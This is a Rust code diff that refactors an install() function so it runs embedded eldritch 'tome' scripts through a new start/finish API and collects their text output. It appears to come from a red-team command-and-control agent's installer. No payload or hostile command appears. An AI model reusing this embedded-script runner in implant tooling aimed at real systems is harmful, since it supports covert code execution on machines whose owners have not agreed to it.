@@ -1,5 +1,5 @@
 use anyhow::{anyhow, Result};
-use eldritch::{pb::Tome, Runtime};
+use eldritch::pb::Tome;
 use std::collections::HashMap;
 
 pub async fn install() {
@@ -31,24 +31,15 @@ pub async fn install() {
             // Run tome
             #[cfg(debug_assertions)]
             log::info!("running tome {embedded_file_path}");
-            let (runtime, handle) = Runtime::new();
-            match tokio::task::spawn_blocking(move || {
-                runtime.run(Tome {
-                    eldritch,
-                    parameters: HashMap::new(),
-                    file_names: Vec::new(),
-                });
+            let mut runtime = eldritch::start(Tome {
+                eldritch,
+                parameters: HashMap::new(),
+                file_names: Vec::new(),
             })
-            .await
-            {
-                Ok(_) => {}
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("failed waiting for tome execution: {}", _err);
-                }
-            }
+            .await;
+            runtime.finish().await;
 
-            let _output = handle.collect_text().join("");
+            let _output = runtime.collect_text().join("");
             #[cfg(debug_assertions)]
             log::info!("{_output}");
         }
